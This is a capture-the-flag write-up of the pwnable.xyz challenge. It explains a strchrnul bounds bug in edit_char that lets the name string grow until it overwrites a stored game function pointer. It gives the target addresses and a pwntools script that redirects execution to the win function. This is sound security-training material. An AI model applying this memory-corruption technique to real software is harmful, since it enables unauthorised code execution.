# Overview

Initially the program prompts for username then continue with the menu. Users can 

![image](https://user-images.githubusercontent.com/17574533/213935649-31831ddb-5841-412e-a601-f17a7832d306.png)

## Options

![image](https://user-images.githubusercontent.com/17574533/214160453-7ab8f668-4b93-4e11-8ff6-aea34e6a927b.png)

Option 1 calls the _game_. A game is stored at `**(cur+0x88)`

Option 2 calls `save_game()`

Option 3 calls `delete_save()`

Option 4 just prints the current name

Option 5 calls `edit_char()`

Option 0 exits the program


## Option 0

Exits the program


# Goal

Call `win` which will print out the flag

![image](https://user-images.githubusercontent.com/17574533/214160966-a2e89a85-3432-42b7-a5be-e7592d26eec8.png)


# Vulnerability

Buffer Overflow: 

`edit_char` uses `strchrnul` which [returns a pointer to the null byte at the end of the string, rather than NULL](https://linux.die.net/man/3/strchrnul). It is used here without checking the bounds of the character to replace.

This example replaces `Z` with `f`. `Z` doesn't exist so the `0x00` is replaced instead
| Before | After |
| - | - |
| ![image](https://user-images.githubusercontent.com/17574533/214178199-ea6f00ca-1436-4427-8183-1ce32d4e59a9.png) | ![image](https://user-images.githubusercontent.com/17574533/214178210-5bf2fc37-64f2-4f1f-bf71-42b8c5b8b80a.png) |

By replacing multiple `0x00` we can 'grow' the name string to also include the bytes beyond its original length.


# Observation

1. The maximum length of name is `0x7f` or 127. This includes `\n` and `\x00` when entering manually

2.

![image](https://user-images.githubusercontent.com/17574533/214178284-b423b1ee-873e-419d-a8d9-1d8ee08a4068.png)

The game is stored at `cur+0x88` (highlighted). It can be overwritten using `edit_char`

3. The default game address is at `0x00400d6b`

4. The address of win is located at `0x00400cf3`


# Exploit

1. Use Option 5 to replace `0x00` until the name string grows to include the word at `cur+0x88`
2. Use Option 5 to replace `0x00400d6b` to `0x00400cf3` (change 2 lower bytes)
3. Use Option 1 to jump to win function

## Code

``` python
from pwn import *

e = ELF("challenge")
p = remote("svc.pwnable.xyz", 30015)

payload = b"D" * 0x7f
p.recvuntil(b":")
p.send(payload)

# grow the string
# change 5 \x00 to D with strchrnul
for i in range(0, 5):
    p.recvuntil(b">")
    p.sendline(b'5')
    p.recvuntil(b":")
    p.sendline(b'Z')
    p.sendline(b'D')

# change 0x400d6b to 0x400cf3
p.recvuntil(b">")
p.sendline(b'5')
p.recvuntil(b":")
p.sendline(b'\x0d')
p.sendline(b'\x0c')

p.recvuntil(b">")
p.sendline(b'5')
p.recvuntil(b":")
p.sendline(b'\x6b')
p.sendline(b'\xf3')

# Jump to win
p.sendline(b'1')
p.interactive()
```

Note: This exploit works _sometimes_ because the number of `\x00` to be replaced varies. Just run multiple times
